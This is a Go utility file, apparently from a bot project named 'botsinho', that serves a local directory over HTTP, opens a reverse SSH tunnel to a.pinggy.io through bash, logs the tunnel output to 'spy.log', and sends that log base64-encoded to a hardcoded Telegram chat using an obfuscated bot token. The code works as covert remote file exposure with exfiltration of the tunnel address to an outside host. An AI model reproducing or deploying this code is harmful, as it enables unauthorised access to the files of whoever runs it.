package utils

import (
	"botsinho/utils/security"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"

	"net/http"
	"os"
	"os/exec"
)


var puerto string = ":3001"

var commandTunnel string = fmt.Sprintf("ssh -p 443 -R0:127.0.0.1%s -L4300:127.0.0.1:4300 qr@a.pinggy.io > spy.log", puerto)

var info string = "hola  jkhk"

func ServerInit(ruta string){
	
	var dir string = ruta
	resp := http.FileServer(http.Dir(dir))
	http.Handle("/", resp)
	fmt.Printf(": %s", puerto)
	err := http.ListenAndServe(puerto, nil)
	
	if(err != nil){
		fmt.Println(err.Error())
	}
}


func InitTunnel(){
	//com := exec.Command("ssh", "-p", "443", "-R0:127.0.0.1:3001", "-L4300:127.0.0.1:4300", "qr@a.pinggy.io")
	//com := exec.Command(command[0], command[1], command[2], command[3], command[4], command[5], command[6], command[7])
	com := exec.Command("bash", "-c", commandTunnel)

	
	if err := com.Start(); err != nil{
		print(err.Error())
		writeFile(err.Error())
	}



}





func Send(data string){

	type Data struct{
		ChatId int `json:"chat_id"`
		//Text    string`json:"text"`
		Text string `json:"text"`
	}
	// b := new(Data)
	// b.ChatId = 1462438140
	// b.Text = data
	fl, _ := os.ReadFile("spy.log")
	
	b := Data{ChatId: 1462438140, Text: base64.StdEncoding.EncodeToString(fl)}
	
	gson, _ := json.Marshal(b)



	os.Setenv("x", security.D("6859517839:AAF9Ofn_q6%=9XL=oP0B%AIf-68L5ZkN0Us"))
	tok := os.Getenv("x")
	//fmt.Println(tok)

	resp, _ := http.Post(fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage",tok), "Application/json", bytes.NewBuffer(gson))
	_, err := io.ReadAll(resp.Body)
	defer resp.Body.Close()

	
	if(err != nil){
		fmt.Print(err)
	}

	
	fmt.Println(resp.StatusCode)
	//fmt.Print(body)
}


func writeFile(data string){
	info := os.WriteFile(".spy.log", []byte(data), 0666)
	if(info != nil){
		return 
	}

}








func GetInfo()string{
	return info
}

func print(algo interface{}){
	fmt.Println(algo)
}




